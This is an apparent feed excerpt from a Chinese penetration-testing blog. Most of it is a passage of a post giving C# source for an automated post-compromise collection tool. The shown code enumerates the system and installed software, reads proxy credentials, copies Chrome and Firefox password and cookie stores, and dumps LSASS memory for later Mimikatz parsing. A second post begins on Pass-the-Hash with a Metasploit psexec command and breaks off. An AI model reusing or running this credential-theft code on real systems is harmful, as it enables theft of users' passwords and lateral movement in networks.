<span class="string">"wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size"</span>,</span><br><span class="line">                <span class="comment">// 判断 .NET 版本</span></span><br><span class="line">                <span class="string">"dir %WINDIR%\\Microsoft.NET\\Framework\\v*"</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (<span class="keyword">string</span> command in commands)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> FileName = command.Replace(<span class="string">"/"</span>, <span class="string">""</span>).Replace(<span class="string">"-"</span>, <span class="string">""</span>).Replace(<span class="string">"+"</span>, <span class="string">""</span>).Replace(<span class="string">"%"</span>, <span class="string">""</span>).Replace(<span class="string">","</span>, <span class="string">""</span>).Replace(<span class="string">"="</span>, <span class="string">""</span>).Replace(<span class="string">"*"</span>, <span class="string">""</span>).Replace(<span class="string">"\\"</span>, <span class="string">""</span>);</span><br><span class="line">                ProcessStartInfo proccessStartInfo = <span class="keyword">new</span> ProcessStartInfo(<span class="string">"cmd.exe"</span>, <span class="string">" /c "</span> + command);</span><br><span class="line">                proccessStartInfo.CreateNoWindow = true;</span><br><span class="line">                Process <span class="function"><span class="keyword">proc</span> = <span class="title">new</span> <span class="title">Process</span> &#123; <span class="title">StartInfo</span> = <span class="title">proccessStartInfo</span> &#125;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">RedirectStandardOutput</span> = <span class="title">true</span></span>; <span class="comment">// 由调用程序获取输出信息</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">UseShellExecute</span> = <span class="title">false</span></span>; <span class="comment">// 是否使用操作系统shell启动</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">CreateNoWindow</span> = <span class="title">true</span></span>; <span class="comment">// 不显示程序窗口</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">Start</span><span class="params">()</span></span>; <span class="comment">// 启动程序</span></span><br><span class="line">                <span class="keyword">string</span> outlist = <span class="function"><span class="keyword">proc</span>.<span class="title">StandardOutput</span>.<span class="title">ReadToEnd</span><span class="params">()</span></span>;</span><br><span class="line">                TxtWriter(outlist, FileName);</span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">WaitForExit</span><span class="params">()</span></span>; <span class="comment">// 等待程序执行完退出进程</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">Close</span><span class="params">()</span></span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="5-程序安装及版本"><a href="#5-程序安装及版本" class="headerlink" title="5) 程序安装及版本"></a>5) 程序安装及版本</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找安装程序及版本</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetInstalledApplications</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 从注册 Uninstall 表项中提取相关信息，进行筛选</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">string</span> basekey = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"</span>;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123; <span class="comment">// This key exists</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> rname <span class="keyword">in</span> registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    <span class="keyword">if</span> (installedapp != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">string</span> displayname = (installedapp.GetValue(<span class="string">"DisplayName"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"DisplayName"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">string</span> displayversion = (installedapp.GetValue(<span class="string">"DisplayVersion"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"DisplayVersion"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">string</span> helplink = (installedapp.GetValue(<span class="string">"HelpLink"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"HelpLink"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!(Regex.IsMatch(displayname, <span class="string">"^(Service Pack \\d+|(Definition\\s|Security\\s)?Update) for"</span>) &amp;&amp; Regex.IsMatch(helplink, <span class="string">"support\\.microsoft"</span>)) &amp;&amp; displayname != <span class="string">""</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (displayversion != <span class="string">""</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname + " (" + displayversion + ")");</span></span><br><span class="line">                                <span class="keyword">string</span> displaynameversion = displayname + <span class="string">" ("</span> + displayversion + <span class="string">")"</span>;</span><br><span class="line">                                TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname);</span></span><br><span class="line">                                TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            basekey = <span class="string">"Software\\Microsoft\\Installer\\Products"</span>;</span><br><span class="line">            registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> rname <span class="keyword">in</span> registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    <span class="keyword">if</span> (installedapp != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">string</span> displayname = (installedapp.GetValue(<span class="string">"ProductName"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"ProductName"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">if</span> (displayname != <span class="string">""</span>)</span><br><span class="line">                            <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname);</span></span><br><span class="line">                            TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="6-最近浏览的文件"><a href="#6-最近浏览的文件" class="headerlink" title="6) 最近浏览的文件"></a>6) 最近浏览的文件</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Recent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 最近预览的文件</span></span><br><span class="line"><span class="comment">             * - 在 Tools 有朋友发过类似的 bat 脚本，实现原理是遍历用户目录下的lnk和url文件，然后调用vbs脚本获取快捷方式所指向的文件或者网址</span></span><br><span class="line"><span class="comment">             * - 参考：https://www.t00ls.net/articles-46152.html</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">string</span> userPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);</span><br><span class="line">            <span class="keyword">string</span> recents = <span class="string">@"Microsoft\Windows\Recent"</span>;</span><br><span class="line">            <span class="keyword">string</span> recentsPath = Path.Combine(userPath, recents);</span><br><span class="line">            DirectoryInfo di = <span class="keyword">new</span> DirectoryInfo(recentsPath);</span><br><span class="line">            <span class="comment">//Console.WriteLine("[+] Recent Items in " + recentsPath);</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> file <span class="keyword">in</span> di.GetFiles())</span><br><span class="line">            &#123;</span><br><span class="line">                TxtWriter(file.Name, <span class="string">"最近预览的文件"</span>);</span><br><span class="line">                <span class="comment">//Console.WriteLine("\t[*] " + file.Name);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="7-网络代理信息"><a href="#7-网络代理信息" class="headerlink" title="7) 网络代理信息"></a>7) 网络代理信息</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetProxyInformation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - GetSystemWebProxy() 返回使用当前模拟用户的 Internet Explorer 设置配置的代理</span></span><br><span class="line"><span class="comment">             * - 使用代理访问 google.com 进行确认</span></span><br><span class="line"><span class="comment">             * - 如果存在验证情况，则将相关信息进行输出</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            IWebProxy wp = WebRequest.GetSystemWebProxy();</span><br><span class="line">            <span class="keyword">string</span> url = <span class="string">"https://www.google.com"</span>;</span><br><span class="line">            Uri req = <span class="keyword">new</span> Uri(url);</span><br><span class="line">            <span class="comment">//Console.Out.WriteLine("[+] URL Requested: " + req.AbsoluteUri);</span></span><br><span class="line">            Uri proxy = wp.GetProxy(req);</span><br><span class="line">            <span class="keyword">if</span> (String.Compare(req.AbsoluteUri, proxy.AbsoluteUri) != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//Console.Out.WriteLine("\t[*] Proxy: DIRECT");</span></span><br><span class="line">                TxtWriter(proxy.AbsoluteUri, <span class="string">"网络代理情况"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (wp.Credentials != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                NetworkCredential cred = wp.Credentials.GetCredential(req, <span class="string">"basic"</span>);</span><br><span class="line">                <span class="keyword">string</span>[] cerd = &#123; cred.UserName, cred.Password, cred.Domain &#125;;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> cers <span class="keyword">in</span> cerd)</span><br><span class="line">                &#123;</span><br><span class="line">                    TxtWriter(cers, <span class="string">"网络代理情况"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="8-浏览器相关文件"><a href="#8-浏览器相关文件" class="headerlink" title="8) 浏览器相关文件"></a>8) 浏览器相关文件</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 Chrome 相关</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> ChromeLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">string</span> localAppData = Environment.GetEnvironmentVariable(<span class="string">"USERPROFILE"</span>);</span><br><span class="line">            <span class="keyword">string</span> ChromeBasePath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\AppData\\Local\\Google\\Chrome"</span>, localAppData);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">if</span> (Directory.Exists(ChromeBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取 Chrome 浏览器相关文件路径</span></span><br><span class="line">                <span class="keyword">string</span> ChromeHistoryPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\History"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeBookmarkPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Bookmarks"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeCookiesPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Cookies"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span> ChromeLoginDataPath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\User Data\\Default\\Login Data"</span>, ChromeBasePath);</span><br><span class="line">                <span class="keyword">string</span>[] ChromePaths = &#123; ChromeHistoryPath, ChromeBookmarkPath, ChromeCookiesPath, ChromeLoginDataPath &#125;;</span><br><span class="line">                <span class="comment">// 创建文件夹、判断文件是否存在</span></span><br><span class="line">                <span class="keyword">string</span> FilePath = CreateBrowserDirectory(<span class="string">"\\Chrome"</span>);</span><br><span class="line">                foreach (<span class="keyword">string</span> filePath in ChromePaths)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">if</span> (<span class="built_in">File</span>.Exists(filePath))</span><br><span class="line">                    &#123;</span><br><span class="line">                        var FileName = filePath.Substring(filePath.LastIndexOf(<span class="string">'\\'</span>));</span><br><span class="line">                        <span class="built_in">File</span>.Copy(filePath, FilePath + FileName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Not Chrome Directory"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取 Friefox 相关</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> FroefoxLocation()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取 Friefox 浏览器目录</span></span><br><span class="line">            <span class="keyword">string</span> localAppData = Environment.GetEnvironmentVariable(<span class="string">"USERPROFILE"</span>);</span><br><span class="line">            <span class="keyword">string</span> FirefoxBasePath = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"</span>, localAppData);</span><br><span class="line">            <span class="built_in">if</span> (Directory.Exists(FirefoxBasePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取 Friefox 浏览器相关文件路径</span></span><br><span class="line">                <span class="keyword">string</span>[] directories = Directory.GetDirectories(FirefoxBasePath);</span><br><span class="line">                foreach (<span class="keyword">string</span> directory in directories)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> FirefoxPlaces = <span class="keyword">string</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"places.sqlite"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxCer_1 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"cert8.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxCer_2 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"cert9.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxKey_1 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"key3.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxKey_2 = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"key4.db"</span>);</span><br><span class="line">                    <span class="keyword">string</span> FirefoxLogon = <span class="keyword">String</span>.Format(<span class="string">"&#123;0&#125;\\&#123;1&#125;"</span>, directory, <span class="string">"logins.json"</span>);</span><br><span class="line">                    <span class="keyword">string</span>[] FirefoxPaths = &#123; FirefoxPlaces, FirefoxCer_1, FirefoxCer_2, FirefoxKey_1, FirefoxKey_2, FirefoxLogon &#125;;</span><br><span class="line">                    <span class="comment">// 创建文件夹、判断文件是否存在</span></span><br><span class="line">                    <span class="keyword">string</span> FilePath = CreateBrowserDirectory(<span class="string">"\\Friefox"</span>);</span><br><span class="line">                    foreach (<span class="keyword">string</span> filePath in FirefoxPaths)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">if</span> (<span class="built_in">File</span>.Exists(filePath))</span><br><span class="line">                        &#123;</span><br><span class="line">                            var FileName = filePath.Substring(filePath.LastIndexOf(<span class="string">'\\'</span>));</span><br><span class="line">                            <span class="built_in">File</span>.Copy(filePath, FilePath + FileName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Not Friefox Directory"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="9-MiniDump"><a href="#9-MiniDump" class="headerlink" title="9) MiniDump"></a>9) MiniDump</h3><p>直接取用<code>SharpDump</code>，需要高权限</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">DllImport(<span class="meta-string">"dbghelp.dll"</span>, EntryPoint = <span class="meta-string">"MiniDumpWriteDump"</span>, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)</span>]</span><br><span class="line">      <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">MiniDumpWriteDump</span>(<span class="params">IntPtr hProcess, <span class="keyword">uint</span> processId, SafeHandle hFile, <span class="keyword">uint</span> dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam</span>)</span>;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Minidump</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>      &#123;</span><br><span class="line">          IntPtr targetProcessHandle = IntPtr.Zero;</span><br><span class="line">          <span class="keyword">uint</span> targetProcessId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          Process targetProcess = <span class="literal">null</span>;</span><br><span class="line">          Process[] processes = Process.GetProcessesByName(<span class="string">"lsass"</span>);</span><br><span class="line">          targetProcess = processes[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">try</span></span><br><span class="line">          &#123;</span><br><span class="line">              targetProcessId = (<span class="keyword">uint</span>)targetProcess.Id;</span><br><span class="line">              targetProcessHandle = targetProcess.Handle;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">          &#123;</span><br><span class="line">              Console.WriteLine(String.Format(<span class="string">"\n[X] Error getting handle to &#123;0&#125; (&#123;1&#125;): &#123;2&#125;\n"</span>, targetProcess.ProcessName, targetProcess.Id, ex.Message));</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">bool</span> bRet = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">string</span> dumpDir = Program.CreateDirectory();</span><br><span class="line">          <span class="keyword">string</span> dumpFile = String.Format(<span class="string">"&#123;0&#125;\\lsass_pid-&#123;1&#125;.dmp"</span>, dumpDir, targetProcessId);</span><br><span class="line">          <span class="comment">//string zipFile = String.Format("&#123;0&#125;\\lsass_pid&#123;1&#125;.bin", dumpDir, targetProcessId);</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">//Console.WriteLine(String.Format("\n[*] Dumping &#123;0&#125; (&#123;1&#125;) to &#123;2&#125;", targetProcess.ProcessName, targetProcess.Id, dumpFile));</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">using</span> (FileStream fs = <span class="keyword">new</span> FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))</span><br><span class="line">          &#123;</span><br><span class="line">              bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (<span class="keyword">uint</span>)<span class="number">2</span>, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="10-文件夹压缩加密"><a href="#10-文件夹压缩加密" class="headerlink" title="10) 文件夹压缩加密"></a>10) 文件夹压缩加密</h3><p><code>AES</code> 加密</p><h2 id="0x02-信息解析模块"><a href="#0x02-信息解析模块" class="headerlink" title="0x02 信息解析模块"></a>0x02 信息解析模块</h2><p> 本文所缺失的相关代码，下步更新放出。</p><h3 id="1-压缩包解密"><a href="#1-压缩包解密" class="headerlink" title="1) 压缩包解密"></a>1) 压缩包解密</h3><p><code>AES</code> 解密</p><h3 id="2-MiniDump"><a href="#2-MiniDump" class="headerlink" title="2) MiniDump"></a>2) MiniDump</h3><p>利用 <code>subtee</code> 的 <code>PELoader</code> 加载 <code>Mimikatz</code> 的自定义版本，加载 <code>minidump</code> 文件，运行 <code>sekurlsa :: logonpasswords</code> 和 <code>sekurlsa::ekeys</code></p><h3 id="3-浏览器相关"><a href="#3-浏览器相关" class="headerlink" title="3) 浏览器相关"></a>3) 浏览器相关</h3><p>解析相关 <code>sqlite</code> 文件</p><p>解析密码文件</p><h2 id="0x03-整合的相关项目列表"><a href="#0x03-整合的相关项目列表" class="headerlink" title="0x03 整合的相关项目列表"></a>0x03 整合的相关项目列表</h2><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna" target="_blank" rel="noopener">AVQuery.cna</a></p><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna" target="_blank" rel="noopener">EDR.cna</a></p><p><a href="https://github.com/secgroundzero/SharpAttack" target="_blank" rel="noopener">SharpAttack</a></p><p><a href="https://github.com/GhostPack/SafetyKatz" target="_blank" rel="noopener">SafetyKatz</a></p><p>这类型的开源项目，完全可以从中拓展，改写成适合自己的工具。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>【知识回顾】Pass The Hash</title>
    <link href="https://rcoil.me/2019/04/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Pass%20The%20Hash/"/>
    <id>https://rcoil.me/2019/04/【知识回顾】Pass The Hash/</id>
    <published>2019-04-04T03:14:38.000Z</published>
    <updated>2019-10-31T15:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。</p><h1 id="0x01-【知识回顾】Pass-The-Hash的原理"><a href="#0x01-【知识回顾】Pass-The-Hash的原理" class="headerlink" title="0x01  【知识回顾】Pass The Hash的原理"></a>0x01  【知识回顾】Pass The Hash的原理</h1><ul><li>在windows系统中，通常会使用<code>NTLM身份认证</code>。</li><li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li><li>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。</li><li>这个不是漏洞。</li></ul><h1 id="0x02-常用攻击方式"><a href="#0x02-常用攻击方式" class="headerlink" title="0x02 常用攻击方式"></a>0x02 常用攻击方式</h1><ul><li><p><strong>meterpreter</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">psexec_psh</span></span><br></pre></td></tr></table></figure></li><li><p><strong>wmiexec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 